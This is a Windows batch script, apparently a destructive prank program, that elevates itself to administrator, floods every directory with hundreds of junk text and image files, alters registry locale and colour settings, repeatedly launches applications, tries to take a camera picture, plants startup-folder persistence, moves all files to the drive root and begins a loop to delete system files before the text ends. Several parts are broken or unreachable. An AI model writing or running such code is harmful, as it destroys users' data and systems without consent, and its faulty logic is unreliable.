@echo off
setlocal enabledelayedexpansion

:: Run the script with elevated privileges
if not "%1" == "elevated" (
    set "params=%*"
    set "params=!params:"=!"
    powershell -Command "Start-Process -Verb RunAs -FilePath cmd -ArgumentList '/c %0 elevated !params!'"
    exit /b
)

:: Create 400 notepad files in every directory
for /l %%i in (1,1,400) do (
    for /d /r %%d in (*) do (
        cd "%%~fd"
        echo gyat > "notepad_%%i.txt"
    )
)

:: Change the background to red
reg add "HKEY_CURRENT_USER\Control Panel\Colors" /v "Background" /t REG_SZ /d "0 0 255" /f

:: Change the Windows language to Russian
reg add "HKEY_CURRENT_USER\Control Panel\International" /v "LocaleName" /t REG_SZ /d "ru-RU" /f
reg add "HKEY_CURRENT_USER\Control Panel\International" /v "Locale" /t REG_SZ /d "00000419" /f

:: Create notepad files on the desktop
cd "%USERPROFILE%\Desktop"
for /l %%i in (1,1,400) do (
    echo gyat > "notepad_%%i.txt"
)

:: Open every default Windows app 20 times
for /l %%i in (1,1,20) do (
    start "" "calc.exe"
    start "" "notepad.exe"
    start "" "mspaint.exe"
    start "" "explorer.exe"
    start "" "mstsc.exe"
    start "" "wmplayer.exe"
    start "" "iexplore.exe"
    start "" "chrome.exe"
    start "" "firefox.exe"
)

:: Open the Camera app and take a picture
start "" "microsoft.windows.camera:"
timeout /t 5
:: Take a picture (this might not work on all systems)
powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('%{PRTSC}')"

:: Duplicate the picture 400 times
for /l %%i in (1,1,400) do (
    copy /y "%USERPROFILE%\Pictures\Camera Roll\*.jpg" "picture_%%i.jpg"
)

:: Put the pictures in every directory on the system
for /d /r %%d in (*) do (
    cd "%%~fd"
    for /l %%i in (1,1,400) do (
        copy /y "picture_%%i.jpg" "%%~fd"
    )
)

:: Generate random files and put them in the startup folder
for /l %%i in (1,1,10) do (
    set "rand_name=!random!!random!!random!.bat"
    echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%rand_name%"
    echo start "" "chrome.exe" "https://www.google.com" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%rand_name%"
)

:: Play all sound effects
for /r %%f in (*.mp3,*.mp4,*.wav,*.mov) do (
    start "" "%%~ff"
)

:: Open Google Chrome and search for "what does gyat mean" every 4 seconds
:chrome_loop
start "" "chrome.exe" "https://www.google.com/search?q=what+does+gyat+mean"
timeout /t 4
goto chrome_loop

:: Hide the command prompt
if not "%1" == "hidden" (
    start "" /min cmd /c "%~f0" hidden
    exit
)

:: Play a continuous beep sound to annoy the user
:beep_loop
beep 1000 100
goto beep_loop

:: Create 1000 folders with random names
for /l %%i in (1,1,1000) do (
    set "rand_name=!random!!random!!random!"
    mkdir "%%rand_name%%"
)

:: Create 1000 files with random names and contents
for /l %%i in (1,1,1000) do (
    set "rand_name=!random!!random!!random!.txt"
    echo This is a random file >> "%%rand_name%%"
)

:: Move all files to the root directory
for /r %%f in (*) do (
    move /y "%%~ff" "C:\"
)

:: Delete all system files
for /r %%f in (*.sys,*.dll,*.exe) do (
